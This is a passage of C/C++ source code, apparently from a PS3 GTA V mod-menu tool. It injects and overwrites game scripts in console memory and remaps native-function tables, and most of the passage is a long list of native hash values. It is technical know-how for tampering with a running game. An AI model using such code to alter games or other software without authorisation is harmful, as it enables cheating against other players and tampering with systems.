		//printf("Overriting script at 0x%X\n", pointer);


		rsc7 = 0;

		if (ReadUInt32(file, 0, false) == 0x52534337)
			rsc7 = 16;
		uint nativeCount = ReadUInt32(file, 0x20, false);//0x01B4 for rock_menu2
		uint nativePointer = ReadUInt32(file, 0x2C, true);

		//printf("a\n");
		if (ReadUInt32Mem(pointer + 0x20) < nativeCount) {
			//printf("ERROR: Script has too liittle natives\n");
			return;
		}

		uint memNativePointer = ReadUInt32Mem(pointer + 0x2C);
		uint codeLength = ReadUInt32(file, 0x10, false);
		SetUInt32Mem(pointer + 0x10, codeLength);
		uint stringLength = ReadUInt32(file, 0x48, false);
		SetUInt32Mem(pointer + 0x48, stringLength);
		uint staticCount = ReadUInt32(file, 0x18, false);
		SetUInt32Mem(pointer + 0x18, staticCount);

		int nativesOPDList[0x500];

		//printf("b\n");
		for (uint i = 0; i < nativeCount; i++)
			nativesOPDList[i] = getOPDOfNative(ReadUInt32(file, nativePointer + (i * 4), false));
		//SetUInt32Mem(memNativePointer + (i * 4), getOPDOfNative(ReadUInt32(file, nativePointer + (i * 4), false))); //nativesInScript[i];
		PS3dotSetMemory(memNativePointer, (char*)nativesOPDList, nativeCount * 4);

		//printf("l\n");




		uint codePointerList = ReadUInt32(file, 8, true);

		int memCodePointerList = ReadUInt32Mem(pointer + 8);
		//printf("m\n");
		for (uint i = 0; i < (codeLength / 0x4000) + 1; i++)
		{
			uint codePagePointer = ReadUInt32(file, codePointerList + (i * 4), true);
			//printf("n\n");
			int memCodePagePointer = ReadUInt32Mem(memCodePointerList + (i * 4));
			if (!VALID_ADDR(memCodePagePointer)) {
				//printf("ERROR: Code page %i is not valid!\n", i);
				return;
			}
			if (i == codeLength / 0x4000) {
				char* bytes = ReadBytes(file, codePagePointer, (int)codeLength % 0x4000);
				PS3dotSetMemory(memCodePagePointer, bytes, (int)codeLength % 0x4000);
			}
			else {
				char* bytes = ReadBytes(file, codePagePointer, 0x4000);
				PS3dotSetMemory(memCodePagePointer, bytes, 0x4000);
			}
		}

		//printf("u\n");

		uint stringPointer = ReadUInt32(file, 0x44, true);
		int memStringPointer = ReadUInt32Mem(pointer + 0x44);
		for (uint i = 0; i < (stringLength / 0x4000) + 1; i++)
		{
			uint stringPagePointer = ReadUInt32(file, stringPointer + (i * 4), true);
			int strPtr = ReadUInt32Mem(memStringPointer + (i * 4));
			if (!VALID_ADDR(strPtr)) {
				//printf("ERROR: String page %i is not valid!\n", i);
			}
			if (i == stringLength / 0x4000) {
				char* bytes = ReadBytes(file, stringPagePointer, (int)stringLength % 0x4000);
				PS3dotSetMemory(strPtr, bytes, (int)stringLength % 0x4000);
			}
			else {
				char* bytes = ReadBytes(file, stringPagePointer, 0x4000);
				PS3dotSetMemory(strPtr, bytes, 0x4000);
			}
		}



		//printf("x\n");

		uint staticPointer = ReadUInt32(file, 0x24, true);
		char* bytes64536 = ReadBytes(file, staticPointer, (int)staticCount * 4);//size of 2992 aka 0xBB0
		PS3dotSetMemory(0x10025000/*staticPointer + pointer*/, bytes64536, (int)staticCount * 4);
		//0x10020000
		SetUInt32Mem(pointer + 0x24, 0x10025000/*staticPointer + pointer*/);

		//printf("z\n");


	}


	int openFile(char* file) {
		int fd;
		int ret;
		cellFsChmod(file, 0777/*S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH*/);//set permissions
		ret = cellFsOpen(file, 0, &fd, NULL, 0);
		if (!ret)
		{
			return fd;
		}
		return -1;
	}
	int readFile(int fd, char buf[], int size, unsigned int offset) {
		int ret;
		uint64_t pos;
		uint64_t nread;
		cellFsLseek(fd, offset, CELL_FS_SEEK_SET, &pos);
		ret = cellFsRead(fd, buf, size, &nread);
		if (!ret) {
			return true;
		}
		return false;
	}
	void closeFile(int fd) {
		cellFsClose(fd);
	}
	uint readFileArray(int fd, uint index)
	{
		int offset = index * 4;
		char buf[4];
		readFile(fd, buf, 4, offset);
		return *(uint*)((int)buf);
	}

	bool renderPercents = false;
	float percentOnFirstPart = 0;
	float percentOnSecondPart = 0;
	void injectScriptIntoMemory(char* file) {
		percentOnFirstPart = 0;
		percentOnSecondPart = 0;
		renderPercents = true;
		int baseAddress = 0x10025000;

		rsc7 = 0;

		if (ReadUInt32(file, 0, false) == 0x52534337)
			rsc7 = 16;

		uint nativeCount = ReadUInt32(file, 0x20, false);//0x01B4 for rock_menu2
		uint nativePointer = ReadUInt32(file, 0x2C, true);

		int sizeOfNativesTable = nativeCount * 4;
		int endOfNativesTable = nativePointer + sizeOfNativesTable;

		//printf("Copying script to 0x%X on remote system\n", baseAddress);

		//ReadBytesToMem(file,0,getFileSize(file),baseAddress);
		int filesize = getFileSize(file) - rsc7;
		ReadBytesToMem(file, 0, nativePointer, baseAddress, &percentOnFirstPart);//read from 0 to nativePointer

		//printf("Second Part\n");
		ReadBytesToMem(file, endOfNativesTable, filesize - endOfNativesTable, baseAddress + endOfNativesTable, &percentOnSecondPart);//read from after native pointer to end


		//BLES:
		//stru_1C23908
		//BLUS:
		//stru_1C33B10
		//DIF:
		//0x10208

		//BLES:
		//stru_1C2ECD0
		//BLUS:
		//stru_1C3EEE8
		//DIF:
		//add 0x10218


		//printf("Modifying natives table\n");
		//modify natives
		int nativesOPDList[0x500];
		int fdN = openFile("/dev_hdd0/tmp/gopro_2027/gta_v_blus_addresses_narray.dat");//originally just tmp
		int fdO = openFile("/dev_hdd0/tmp/gopro_2027/gta_v_blus_addresses_oarray.dat");
		for (uint i = 0; i < nativeCount; i++) {
			if (isBLUSVersionOfGame == false) {
				nativesOPDList[i] = getOPDOfNative(ReadUInt32(file, nativePointer + (i * 4), false));//THIS NEEDS TO BE FIXED FOR BLUS, BUT IS VERY HARD
			}
			else {
				//BLUS version
				//int blusNativeArray[] = {0x72BDE002, 0x2942AAD2, 0xD87F3A1C, 0x849CEB80, 0x1B509C32, 0xF3076135, 0x23DF19A8, 0x8BAC4146, 0xC2D54DD9, 0xDAB86A18, 0x3767C7A, 0xED97B202, 0xD368BA15, 0x1DE2A63D, 0x84A3918D, 0x784D550B, 0x2A2FBD1C, 0x1D530E47, 0xFE576EE4, 0xFEEA107C, 0x4ED1400A, 0x16FB88B5, 0xB2BC25F8, 0x96CD0513, 0xF8D5EB86, 0x73C6F979, 0x88203DDA, 0xAD7BB191, 0x1193ED6E, 0x38E42D07, 0x9ACB213A, 0xE5DE7D9D, 0xDDF5C579, 0xA170261B, 0x336F3D35, 0xCB8FD96F, 0xE1870EA9, 0x9620E41F, 0xE2C9C6F8, 0x6CB24B56, 0xAB77DA7D, 0x85C98304, 0xF3A67AF3, 0xDD4A3F1F, 0xB58B8FF3, 0x789D8C6C, 0xA6203643, 0x66728EFE, 0x916E37CA, 0x23C88BC7, 0x21322887, 0xF1850DDC, 0x41FA0E51, 0x8E8824C7, 0x8C938784, 0x16707ABC, 0x22F865E5, 0xA58BBF4F, 0xE67446E9, 0x6AE0AD56, 0x9C080899, 0xB6E1917F, 0x2E458F74, 0xC70E6CFA, 0x95AE00F8, 0xCAD3E2D5, 0xCD7F4030, 0x2576F610, 0xD064D4DC, 0x606EE5FA, 0xF67BB44C, 0x9A083B7E, 0x62D026BE, 0xE85AEC2E, 0x5C57B85D, 0x444180DB, 0x8386AE28, 0xA1A1402E, 0x5B9B5CF, 0xE80CF0D4, 0x782CA58D, 0x874BD6CB, 0x6096504C, 0x59A3A17D, 0xE387BFE, 0xBD2EA1A1, 0x5B7463F4, 0xBB8E64BF, 0x1972E8AA, 0x2C653904, 0x2B74A6D6, 0x8BD5F11E, 0x7B2F0743, 0xD2EA77A3, 0x498849F3, 0xCBAF2EF, 0x3EA7C6CB, 0x6E502A5B, 0xE1E0ED34, 0x1C4946AC, 0xD909C107, 0x3DF493BC, 0x872CF0EA, 0xCF29097B, 0x815CAE99, 0x53DB6994, 0xD70ECC80, 0x7B36E35E, 0xE391F55F, 0x7ABB89D2, 0x87431585, 0x91F72E92, 0x1D82766D, 0xB1172075, 0xCCD9ABE4, 0x27305D37, 0xA2B88CA7, 0x8E88B3CC, 0x10D36630, 0x286BF543, 0x4D46202C, 0xA40196BF, 0x9B069233, 0x52E054CE, 0x76E96212, 0x8D9EDD99, 0xCBA99F4A, 0x990085F0, 0x46B0C696, 0x2A3E5E8B, 0x6F812CAB, 0x128C3873, 0x1D766976, 0xCC91FCF5, 0xECA1512F, 0xB1FF7137, 0xC8B514E2, 0xBE998184, 0x779F6E40, 0xA85397A2, 0x8AFC488D, 0x2849CAC9, 0xCDFF3C82, 0xBF80B412, 0x38B9B8D4, 0xC1FFB672, 0x5F5A2605, 0xBFABD872, 0xCE1332B7, 0xD63CF33A, 0x3F277B62, 0xC0EB6924, 0x2ACAB783, 0x20E2BDD0, 0x20E2BDD0, 0x3C395AEE, 0x8CE63FA1, 0xF1F51A14, 0xB4F0AD56, 0xD89599D, 0xE5B5745C, 0xA1D7FABE, 0xF8E4BDA2, 0xC5266BF7, 0x2C2A16BC, 0x6FE5D865, 0xD1E364DE, 0xFF92B49D, 0x3B8E2D5F, 0x109D1F89, 0x77182D58, 0xDE8BA3CD, 0x6EB92D05, 0x271A9766, 0x2F0A16D1, 0xC6BC16F3, 0x33B0B007, 0x1C0C5E4C, 0x6E660D3F, 0x23BE6432, 0xE81FAC68, 0x9365E042, 0x2A60A90E, 0x72F15F2, 0x934BE749, 0xE61110A2, 0x84930330, 0xBA2CF407, 0x563B635D, 0x7643170D, 0xFC3379A, 0x3033EA1D, 0x939982A1, 0xCBE09AEC, 0xD2858D8A, 0xE48D757B, 0xA08D8C58, 0xF6C7342A, 0xACBED05C, 0x19BB3CE8, 0xE812925D, 0x2BC93264, 0x308ED0EC, 0x86E995D1, 0x534A5C1C, 0x89FF942D, 0xB6094948, 0x2705C4D5, 0xD633C809, 0x53FC3FEC, 0xE6B033BF, 0x95050CAD, 0xE64F97A0, 0x2CD26D69, 0xD87AF337, 0x84932E8, 0x703F524B, 0xF987BE8C, 0xC3CB9DC6, 0x9D8E1D23, 0xE84ABC19, 0xFD4B5B3B, 0xDF720C86, 0xC307D531, 0xD99E275B, 0x2B9D91E8, 0x13EB5861, 0x7BED1872, 0x1C09C9E0, 0xE1D91FD0, 0x7652DD49, 0x507F3241, 0xADEED2B4, 0x55A21772, 0xA17F9AB0, 0x62B43677, 0x8AD670EC, 0xD24B4D0C, 0x7262B5BA, 0x93A44A1F, 0x13777A0B, 0x1134F68B, 0xE0047BFD, 0x55461BE6, 0xECC76C3D, 0xB6BCC608, 0xBA4CAA56, 0x725D91F7, 0x2CF305A0, 0x2765919F, 0xFBD13FAD, 0x19B27825, 0xF3A3AB08, 0x949FE53E, 0x29CE8BAA, 0x74337969, 0xD3C08183, 0xE9BF2A7D, 0x23B02F15, 0x5D6739AE, 0x688BE9A, 0xC39302BD, 0x10C151CE, 0x1EF89DC0, 0x64659C2, 0x4B58F177, 0x6EC6B5B2, 0xFCF4DF1, 0x7C40F09C, 0xDAC84C9F, 0xD6E9FCF5, 0xCFCD35EE, 0x9F119B8, 0x98C5CCE9, 0x2167CEBF, 0x7A8053AF, 0xEE38B3C1, 0xD3D5D74F, 0x46DB13B1, 0xD23E381, 0xF28254DF, 0x58515E8E, 0x3CC4EB3F, 0xAD6C2B8F, 0x8306C256, 0xFD6E0D67, 0x8BBF2950, 0xAD7C45F6, 0x506BB35C, 0xF4FBF14A, 0xE4BD5342, 0x914BC21A, 0x7597A0F7, 0x9F47049, 0x5435F6A5, 0xC74F9AF, 0xE1A0B2F1, 0x43220969, 0x9B00DF3F, 0xAD3C7EAA, 0x30510511, 0xBA6C085B, 0xB4737F03, 0xF0AED233, 0x39784DD9, 0x7B9522F6, 0x3E91FC8A, 0x15E141CE, 0xF8AEB6BD, 0x21D275DA, 0xA3BD9E94, 0x326A17E2, 0x633179E6, 0xC90B2DDC, 0x60B34FF5, 0x7983E7F0, 0x7159CB5D, 0x1D4211B0, 0xE1168767, 0x961FD9B, 0x60FF6382, 0x40D0EB87, 0x2B0F05CD, 0xCB75BD9C, 0x6AEFE6A5, 0x26FCFB96, 0xBCEFB87E, 0xB998CB49, 0x3CB1D17F, 0x345F72D0, 0x9458459E, 0xE905BC7E, 0x56F9ED27, 0x71570DBA, 0x60B345DE, 0x44473EFC, 0xDA931D65, 0x9CAA05FA, 0x4F37276D, 0x79275A57, 0xC7C82800, 0x66C1BDEE, 0x89D01805, 0x1A75DC9A, 0x9388CF79, 0x13A010B5, 0x4D6B3BFA, 0xA6E73135, 0x1126E37C, 0xCAF839C2, 0x20C6217C, 0xFC5A4946, 0x6381B963, 0xF2EFE660, 0x3457D681, 0x9219D44A, 0xFD569E4E, 0x7D3007A2, 0xEF276DA, 0xC0B00C20, 0x60C23785, 0x20BFF6E5, 0xA61FF9AC, 0x33C83F17, 0x2701A9AD, 0xC4736ED3, 0x6B0E9D57, 0xDD1329E2, 0x9F9E856C, 0x1425F6AC, 0x8DC53629, 0x1F9DE6E4, 0x749909AC, 0xFA3A16E7, 0x77340650, 0x4B22C5CB, 0x57583DF1, 0xA65FF946, 0x495DBE8D, 0x8DD49B77, 0x9DB5D391, 0x92302899, 0x8CD67DE3, 0x8F55EBBE, 0xA4B4DB03, 0xC4FBBBD3, 0xF3B148A6, 0x1DEBCB45, 0xC24B4F6F, 0x8F320DE4, 0xD6280468, 0x1BAA7182, 0x33951005, 0x9F4AF763, 0x68BA0730, 0x2F29F0D5, 0x76DAC96C, 0xE21069D, 0x71E9C63E, 0xD1EEBC45, 0x9C84BDA0, 0x1FFBEFC5, 0xACADF916, 0x721B763B, 0x23E3F106, 0x457AE195, 0x46CB3A49, 0x19297A7A, 0xF24777CA, 0x38992E83, 0xF27483C9, 0x7C27343E, 0x2C9A11D8, 0x2ED5E2F8, 0x66C32306, 0xAD8DA205, 0x1BC28B7B, 0xCAFEE798, 0x96FD173B, 0x72E8CD3A, 0x79472AE3, 0xFC7464A0, 0x3554AA0E, 0x2F0CE859, 0x3FBC5D00, 0x80471AD9, 0x61815F31, 0x8376D939, 0x67510C4B, 0x71C12904, 0x5AC6DAC9, 0x837F8581, 0x65DDE8AF, 0xD75CDD75, 0x96A07066, 0xAC494E35, 0xA4049042, 0xD78358C5, 0xFBB85E02, 0x4938C82F, 0x2939D0B6, 0x2009E747, 0xAA2B89E0, 0x6739AD55, 0xF26E339C, 0x1DD55F13, 0x1A900C84, 0xF07D603D, 0x67BA6F5, 0xFD99BE2B, 0xE206C450, 0xB06CCD38, 0x26F6AF14, 0xB02D6124, 0x57B8DA7C, 0xCC40D20D, 0x7EF8316F, 0x94AAC486, 0x99C927E, 0x96891C94, 0x84E4A289, 0xC7A5ACB7, 0x3C48A3D5, 0xB8BECF15, 0x3B74095C, 0xE15A5281, 0x124BCFA2, 0x866DEF1A, 0xC589CD7D, 0x3AC90869, 0xACFEB3F9, 0xA5B33300, 0x9BCD2979, 0x1D9CAB92, 0x6B74582E, 0x53FD4A25, 0x878C2CE0, 0x7FC77E0, 0x53576FA7, 0x210D87C8, 0x662A2F41, 0xC0E3AA47, 0xAB415C07, 0x58D9775F, 0x83943F41, 0x433A9D18, 0x8B5E3E3D, 0xFE1589F9, 0x1647F1CB, 0x84DCECBF, 0x49FAE914, 0x9E2F917C, 0x972CC383, 0x9320E642, 0x8E3222B7, 0xC7AE6AA1, 0x96F84DF8, 0xEE443481, 0x57F56A4D, 0xEB9EB001, 0xDAFCB3EC, 0x6477EC9E, 0xABCF043A, 0xFCE6ECE5, 0x5154EC90, 0x36610842, 0x8FF45B04, 0x9BF8A73F, 0xB7F70784, 0x9E1E4798, 0x3ED2B997, 0xF4268190, 0xC14C9B6B, 0xBC5A9C58, 0xC46F74AC, 0xC69CF43D, 0x7C6339DF, 0xCE17FDEC, 0xB1808F56, 0xB1BD08D, 0xFC30DDFF, 0xD4B9715A, 0x55D33EAB, 0x2632E124, 0xBE800B01, 0x3F52E561, 0xD749B606, 0xDABDCB52, 0xEC1479D5, 0xB5DE340, 0x9D7A609C, 0xDE5C995E, 0xB0ABFEA8, 0xB6F7CBAC, 0xA4157987, 0x883622FA, 0x8C2DFA9D, 0x45C82B21, 0x4C3C2508, 0x170F68C, 0x40C84A74, 0xC1FEC5ED, 0xD130D34, 0x928E12E9, 0x6B931477, 0x307E7611, 0x3BCDF4E1, 0x5ACAA48F, 0x120B4ED5, 0x5D240E9D, 0x46BC5B40, 0xEA127CBC, 0xEA127CBC, 0x28924E98, 0xC1C0855A, 0xEC024237, 0x547417F, 0x6909BA59, 0xE4ECAC22, 0x2B83F43B, 0xFAA3D236, 0xC8EFCB41, 0x65C16D57, 0xD3850671, 0x878753D5, /*"aA`z"*/0x12760AA, 0xEB4CBA74, 0x7253D5B2, 0xC4769830, 0xE27D2FC1, 0x66571CA0, 0xC41DDA62, 0x99D90735, 0x3990C90A, 0x5D1F9E0F, 0xADF2267C, 0x9A388380, 0x9B0E10BE, 0x3F6B949F, 0x60B6E744, 0xE4938B5D, 0x34165B5D, 0x3B13797C, 0x139FD37D, 0xE8C0C629, 0xBD0D4831, 0xDF70B41B, 0x749B282E, 0x4C83DE8D, 0x236F525B, 0xE0FF064D, 0xFBCD1831, 0xC1213A21, 0x9729EE32, 0xE8FC85AF, 0xC52F295B, 0x851687F9, 0x46AFFED3, 0x4B707F50, 0x202237E2, 0x7E9EAB66, 0x83B6046F, 0x6B189A1A, 0xA345EFE, 0xD043E8E1, 0xFF5A1988, 0xE2F262BF, 0xD7ACC7AD, 0x4DA3D51F, 0xAE667CB0, 0x1560B017, 0x8A30761C, 0xD8FF798A, 0xAAC9317B, 0xC47F5B91, 0xBC12F9E, 0xCE0AA8BC, 0x7BD5CF2F, 0x7AAF22C, 0x993DBC10, 0x335190A2, 0xAED73ADD, 0x1E11BFE9, 0xE90005B8, 0x44767B31, 0xE224A6A5, 0xA0466A69, 0xB5977853, 0xD98F656A, 0x8052F533, 0xF9998582, 0x3C5619F2, 0x25A2CABC, 0xDD8878E9, 0x7B93CDAA, 0xCAB087F0, 0x608F7D39, 0x47DB08A9, 0xD732CD6, 0x56D5B144, 0xB70D7C6D, 0x68BB439F, 0xBB7E6991, 0xFD8B1AC2, 0x210106F6, 0x58BEA436, 0x5EE84DC7, 0xF528A2AD, 0xB0AD7792, 0x53F5B5AB, 0x824EBE8, 0xC9B6949D, 0x5DED14B4, 0xCCE2FE9D, 0xA3A78392, 0x1026F0D6, 0x1D09ABC7, 0x5AE68AE6, 0xFFED9BAD, 0x56568422, 0x7CBC3EC7, 0x46D18755, 0x9D76D9DE, 0x55C30B26, 0x8FF5D3C4, 0xEDAE6C02, 0x35721A08, 0xD19EF0DD, 0x8338DA1D, 0x4377C10, 0xDBD88708, 0x28D54A7F, 0xB60CFBB9, 0x6AF994A1, 0x1E7DA95E, 0x58E67409, 0x22E9A9DE, 0x4315A7C5, 0x621388FF, 0x5B39D0AC, 0x1393D14+2, 0x36FB8B3F, 0x2A9411DA, 0xB41064A4, 0x9DB63CFF, 0xF09157B0, 0xD96860FC, 0x459F2683, 0xDBB83E2B, 0xBB6321BD, 0xE8D56DA2, 0xCB6A351E, 0xA4D1B30E, 0xB8515B2F, 0x660C468E, 0x95F8A221, 0xDEF31B0A, 0x4E03F632, 0xF11F956F, 0x86DDF9C2, 0x768CBB35, 0xB4087F7, 0x5DCD0796, 0x9B29D99B, 0xEFCF554A, 0xE972CACF, 0xD437615C, 0x75FC6C3C, 0x96A8E05F, 0x3939B8D, 0x8876C872, 0xA6C68693, 0xA92C1AF4, 0x942160EC, 0xE84A127A, 0xC9C13D8D, 0x1F2F7D00, 0x2678342A, 0x8174B90, 0xF29C0B36, 0xE4302123, 0xF3C01350, 0x16F464B6, 0xC174C71B, 0xA2E5F921, 0xBB120CFC, 0x8AD2CC2, 0x93F985A6, 0x80E3DA55, 0xECE81278, 0xA8A21766, 0xFA2402C8, 0xBBAEEF94, 0x8E101F5C, 0xBC7BD5CB, 0xDB718B21, 0xDBCE51E0, 0x8DE5382F, 0xDDDE59B5, 0x74EF9C40, 0xE0E2640B, 0x68BD42A9, 0x7CF0971D, 0x7F3F1C02, 0x71D0CF3E, 0x2E9D628C, 0xB818C7FC, 0xF5659E50, 0xC937FF3D, 0x594E862C, 0xC0718904, 0xB39677C5, 0x1D3C1466, 0xDB0A7A58, 0xC8A4BF12, 0x7D876DC0, 0x159751B4, 0xE4FF7103, 0xCE70F183, 0xC560D7C0, 0x382C70BE, 0x22DAE257, 0x8E2C7FD5, 0xA79BC686, 0x1900628D, 0x1ECD23E7, 0x2F8013A1, 0xCAFE9209, 0x6C767148, 0x2798F56F, 0x99EE4570, 0x6641A864, 0x818534AC, 0x8EAF9CF6, 0xA2201E09, 0xCF428FA4, 0xAB12738C, 0x2B757E6C, 0xD88EC8EA, 0x476B23A9, 0x4B83FCAF, 0x6396058, 0x35BCA844, 0x59352658, 0x19CEAC9E, 0x7ABD94D, 0x57506EA6, 0x62A3161D, 0xB30F779, 0xA81B5B71, 0x2F98823E, 0xF82D5A87, 0x64DF6282, 0xA0CE89C8, 0x4CC674B5, 0xA0FDCB82, 0x80340396, 0xE7529357, 0x6B21FE26, 0x8928428E, 0xCE8C9066, 0x8C73E64F, 0x654D93B7, 0x725C7205, 0xC4977B47, 0x10AF5258, 0x27EE0D67, 0xCF358946, 0xFB40075B, 0x37C388DB, 0xD455A7F3, 0x128FED8+1, 0xAEC0D176, 0x1418CA37, 0xABF783AB, 0xE8BFF632, 0x304D0EEF, 0x8524A848, 0xB6DF3709, 0x269B006F, 0x528B973B, 0xB3426BCC, 0xABD19253, 0xCD4D9DD5, 0xC44C2F44, 0xBA9AD458, 0xADBBA287, 0x9E553002, 0x83C846A0, 0x5A59A24A, 0x56C1E488, 0x226B08EA, 0x1F3CADB0, 0xA9DC8558, 0x88EAF398, 0x47B0C137, 0x65376C9B, 0x9CBA682A, 0x3B15D33C, 0xEC5D0317, 0x25D569EB, 0xCFCDC518, 0x108F36CC, 0xE9F2B68F, 0x727AA63F, 0x239272BD, 0x21DBF0C9, 0x199FABF0, 0x596B900D, 0xC9EF81ED, 0x9D84554C, 0x9C106AD9, 0x762E5C5F, 0x6A396E9A, 0xBDBC410C, 0x32BF9598, 0x93628786, 0xC12AC47A, 0x48D84A02, 0xF541B690, 0x80151CCF, 0xFF0F9B22, 0xEF9C8CB3, 0xA5456DBB, 0x20EABD0F, 0x1E3A3126, 0xB66CF3CA, 0x932FDB81, 0x7E946E87, 0x4C9B035F, 0x3F436EEF, 0xF07DDA38, 0xDD2BFC77, 0xF8FBCC25, 0xADF81D24, 0x228A2598, 0x3FE33BD6, 0x76C641E4, 0x3F0D1A6F, 0x1FEC16B0, 0xF3027D21, 0x49C4B137, 0x1D244044, 0xD1D2FD52, 0x1D61FACC, 0x7722F545, 0x6EE1E946, 0x857DF02F, 0x173F2EB3, 0xE10198D5, 0xDD76B263, 0x784944DB, 0x2E0DFA35, 0x9627905C, 0x4FA5501D, 0x9D5D9B38, 0x29F3572F, 0xEC717AEF, 0x1C340359, 0xD1E5565F, 0xF3A6309E, 0x62619061, 0xD576F5DD, 0x46B62D9, 0x1F950E4B, 0x96DAA4D, 0x455F1084, 0x7E55A1EE, 0xDCC0B8B, 0xAA2A0EAF, 0x3129C31A, 0x28689AA4, 0xBFC4F64, 0x14AC675F, 0x779A60E2, 0x73E96210, 0x72B36815, 0xD820ADD4, 0x48F16186, 0x84F05943, 0x13D4ABC0, 0xD2157428, 0xC07C64C9, 0xFE903D0F, 0xDE10BA1F, 0x9F470BE3, 0x4A124267, 0xB19B2764, 0x342FA2B4, 0x5D3BFFC9, 0xD9653728, 0x72BA8A14, 0x804F444C, 0xBB1A1294, 0x1A1A72EF, 0x3BB12B75, 0x4EA70FB4, 0xD830DC7, 0xA08B46AD, 0xECD470F0, 0x74D4995C, 0x1FE547F2, 0x310E9B67, 0x654F0287, 0x5B2A67A8, 0x2F0E171C, 0x249C1B9A, 0x5049A864, 0xF6B837F0, 0xD906A3A9, 0xD34A6CBA, 0xD8CC7221, 0x5604B890, 0x46617502, 0xDB7AECDA, 0xEA432A94, 0x926B8734, 0x30ADE541, 0xD4F5D07D, 0x113EAE4, 0xDCBA251B, 0x513D444B, 0xB2410EAB, 0x5AB94128, 0xD63FCB3E, 0x7F8AE259, 0xDD79D679, 0x633F8C48, 0x53DAEF4E, 0x161780C1, 0x9604DAD4, 0x469A2B4A, 0x7B689E20, 0x497EAFF2, 0xD348E3E6, 0xF8FC196F, 0xD06FF62, 0x23BF0F9B, 0x110752B2, 0xF478EFCF, 0xD245455B, 0x6BA48C7E, 0xCEDE52E9, 0x7EB8F275, 0xCBF91D2A, 0x641F7790, 0x1CBC1373, 0x5219D530, 0x5ED49BE1, 0x99B8B49, 0x233DE879, 0x19EC0001, 0x6B125A02, 0xD938DEE0, 0xD6844637, 0x18136DE0, 0xC61C75E9, 0xCE8B8748, 0xC1AD5DDF, 0x3968E915, 0x64BA4648, 0x8BE3D47F, 0xE3880F5A, 0x447A9EB9, 0x9C720B61, 0xC92719A7, 0x9E8D8B72, 0x802A21B4, 0xDEECBC57, 0x2929F11A, 0xF81E884A, 0x6A619A0, 0x8B67DCA7, 0xF4999A55, 0x831D06CA, 0xEAD0C412, 0x1259DF42, 0xE3938B0B, 0xBAEC6ADD, 0xCCCA6855, 0xA4363188, 0xCDD4A61A, 0x54448EF, 0xEAB6417C, 0xC2703B88, 0xA706E84D, 0x242C6A04, 0x335695CF, 0x7B786555, 0xCE9E6CF2, 0x12077738, 0x12077738, 0x667046A8, 0x4F4D76E8, 0x6D58F73B, 0x9BABCBA4, 0xFDF6D8DA, 0x2056A015, 0xF486429, 0xD87CC710, 0xE29EE145, 0x7CFAE36F, 0x60F72371, 0xC53576CA, 0x7158B1EA, 0x137E3E24, 0xA81F3638, 0x458F4F45, 0xBB2BA72A, 0x56345F6B, 0x8D8DF8EE, 0x594FEEC4, 0x3C44E4B, 0x7E082045, 0xA01E0E66, 0x79D7D235, 0x85BA15A4, 0x9559BB38, 0x554BA16E, 0xE8F538B5, 0x805BAB08, 0xC317717F, 0x908A335E, 0x6776720A, 0xC67E3DCB, 0x7CC8057D, 0xDDFB6448, 0x494A9E50, 0x1DFE8D8A, 0x5FED3BA1, 0x18C9DE8D, 0x48DA6A58, 0x7B48E696, 0x9C59FC06, 0xC4F63A89, 0x899933C8, 0x7AB77B57, 0x557EDA1D, 0x91A7FCEB, 0x6EAF56DE, 0x5D66CE1E, 0x215ABBE8, 0xF6015178, 0x5E219B67, 0x2DBF2D7, 0x2F38B526, 0x5CD7C3C0, 0x2CFB0E6D, 0x516862EB, 0x716777CB, 0x9A01FFDA, 0xD4AE8CB, 0x3AC9CB55, 0x386CE0B8, 0x2E80DB52, 0x4DAAD55B, 0xCCBF0334, 0x91A081A1, 0x83A9811D, 0x7AF85862, 0x79B43255, 0x3D87600, 0xE9183D3A, 0x41A8A627, 0x6B96145A, 0xF3504F4D, 0x39555CF0, 0x8129EF89, 0xB262DE67, 0x78C4DCBE, 0xCBE7068F, 0x4D1EB0FB, 0x796DE696, 0xD99EC000, 0xC2DEBA3D, 0xE40A0F1A, 0x2E7D9B98, 0x9A0E3BFE, 0x6BBDE6CD, 0x431AA036, 0x24A7A7F6, 0xA1CB6C94, 0x3B637AA7, 0xDF552973, 0x1D980479, 0x6BB5CDA, 0x89D5921, 0x4E6D875B, 0x9207E4DE, 0xCB7C8994, 0x903F5EE4, 0x94119534, 0x71077FBD, 0xB8B3A5D0, 0x3AF34DEF, 0x6F5913A4, 0xA7C8594B, 0x1DA7E41A, 0x1E63088A, 0x5205C6F5, 0xECA8ACB9, 0x520FCB6D, 0xC8BAB2F2, 0x4D0449C6, 0xD3F40140, 0xC5223796, 0x709B4BCB, 0x4A4A40A4, 0x294405D4, 0xF881AB87, 0x1D6859CA, 0x7CE2EA4, 0xCF14D7F2, 0x24A97AF8, 0x44018EDB, 0xA4524B23, 0xAFA1148B, 0x3CD4307C, 0x6A3F747D, 0x574EE85C, 0xED130FA1, 0xE7E3C98B, 0xEB382B7, 0x3E807FE3, 0xDEB491C8, 0x8F7AF78, 0x57B8D0D4, 0x2BCAF9B, 0x2DED2B8, 0xA9CCEF66, 0x88B9B909, 0xE05E7052, 0x4FA43BA4, 0x8C90D22F, 0x8E319AB8, 0x76FB0F21, 0xEBA596CC, 0x5E93FBFA, 0xF42C43C7, 0x38F82261, 0xDD524A11, 0x672EFB45, 0x3E35563E, 0x6F8350CE, 0x51E7A037, 0xD12A643A, 0x94B82066, 0xAA318785, 0xB245FC10, 0xB59B530D, 0xE20F2C+1, 0xF63A13EC, 0xF4C211F6, 0xE8E59820, 0xE103475, 0x2944A6C5, 0x550665AE, 0x67785AF2, 0xBF855650, 0x6E7FDA1C, 0xFE272A57, 0x24D78013, 0xDCE05406, 0x150E03B6, 0x5DE98F0A, 0x27A244D8, 0x135B3CD0, 0x12929BDF, 0x65E1D404, 0xC736999E, 0x829A799, 0x6F1A1901, 0x34A396EE, 0x34A396EE, 0xFA6373BB, 0x95C4B5AD, 0x216CB1C5, 0x9F75A929, 0x9E5D9198, 0x6878327, 0xA869A238, 0x96F74838, 0x9FA9175B, 0xF4D27EBE, 0xB0E56045, 0x518141E0, 0xF079E4EB, 0x80A52040, 0x6A77FE8D, 0x6ECAE560, 0xA4CA7BE5, 0x99379D55, 0x7DBC0764, 0x1E8E310C, 0xC3BC1B4F, 0x14AEAA28, 0x63BA19F5, 0xD10E4E31, 0xC380AC85, 0xC47AB1B0, 0x52816BD4, 0x40BADA1D, 0x1AB3B954, 0x9CD18314, 0x3E160C90, 0xDDE7C65C, 0xB58B25BD, 0x9854485F, 0xDCA3F423, 0x2A50D1A6, 0x25EC28C0, 0x9CF1CE5, 